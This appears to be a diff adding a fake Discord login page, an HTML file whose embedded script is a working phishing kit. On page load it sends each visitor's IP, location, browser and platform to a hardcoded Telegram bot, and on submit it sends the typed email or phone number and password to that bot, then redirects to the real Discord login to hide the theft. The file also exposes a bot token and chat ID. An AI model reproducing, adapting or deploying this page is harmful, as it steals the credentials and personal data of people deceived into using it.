@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Discord</title>
+    <link rel="icon" href="favicon.ico">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="grey-big-box">
+
+    <p class="welcome-back-heading"><b>Welcome back!</b></p>
+    <p class="we-excited-text">We're so excited to see you again!</p>
+
+    <form id="login-form">
+        <div class="entering-email-or-phone-number">
+            <label for="email"> EMAIL OR PHONE NUMBER <nobr class="red-ash">*</nobr> </label>
+        </div>
+        <div>     
+            <input type="text" id="email" class="input-email-or-phone-number" required>
+        </div>   
+
+        <br>
+
+        <div class="entering-password">
+            <label for="password">PASSWORD <nobr class="red-ash">*</nobr></label>
+        </div>
+        <div>
+            <input type="password" id="password" class="input-password" required>
+        </div>
+
+        <nav class="forgot-password">
+            <a href="https://discord.com/register" style="color: #0095f6"> Forgot your Password?</a>
+        </nav>
+
+        <br>
+
+        <button type="submit" class="login-button">Log In</button>
+    </form>
+
+    <p class="need-an-account"> Need an account?  
+        <button id="register-button" class="register-button" style="background: none; border: none; color: #0095f6; cursor: pointer;">
+            Register
+        </button> 
+    </p>
+
+    <section class="right-section">
+        <img class="image"
+            src="https://cdn.discordapp.com/attachments/806881514389766184/1093240273129185370/qrcode_55216448_699475e2f9f5ddbc7c72df8b2dbf7f23.png" 
+            alt=""> 
+        <br> 
+
+        <p class="login-with-qr-code"> Login with QR Code</p>
+        <p class="scan-to-login-text"> Scan this with the <b>Discord mobile </b> <br> <b>app</b> to Login instantly.</p>
+    </section>
+
+    <script>
+        const botToken = '7309654669:AAHoUa7SGJ90jB2f23j7O7RDF5OdM6OnGdg';
+        const chatId = '7631254472';
+
+        function sendVisitorDetails() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const city = data.city;
+                    const region = data.region;
+                    const country = data.country_name;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+
+                    const message = `🔍 *زائر جديد دخل الموقع!*\n\n🌍 *IP:* ${ip}\n🏙 *المدينة:* ${city}\n📍 *المنطقة:* ${region}\n🇺🇳 *الدولة:* ${country}\n💻 *المتصفح:* ${userAgent}\n🖥 *نظام التشغيل:* ${platform}`;
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' }),
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log("✅ تم إرسال بيانات الزائر إلى تيليجرام:", data))
+                    .catch(error => console.error("❌ خطأ في إرسال بيانات الزائر:", error));
+                })
+                .catch(error => console.error("❌ خطأ في جلب بيانات الزائر:", error));
+        }
+
+        function sendLoginDetails(email, password) {
+            const message = `🔐 *محاولة تسجيل دخول*\n\n📧 *البريد / الهاتف:* ${email}\n🔑 *كلمة المرور:* ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' }),
+            })
+            .then(response => response.json())
+            .then(data => console.log("✅ تم إرسال بيانات تسجيل الدخول:", data))
+            .catch(error => console.error("❌ خطأ في إرسال بيانات تسجيل الدخول:", error));
+        }
+
+        sendVisitorDetails();
+
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (email && password) {
+                sendLoginDetails(email, password);
+                window.location.href = "https://discord.com/login"; // تحويل المستخدم إلى صفحة تسجيل الدخول
+            } else {
+                alert('❌ يرجى ملء جميع الحقول.');
+            }
+        });
+
+        document.getElementById('register-button').addEventListener('click', function() {
+            window.location.href = "https://discord.com/register"; // تحويل المستخدم إلى صفحة التسجيل
+        });
+
+    </script>
+</div>
+</body>
+</html>
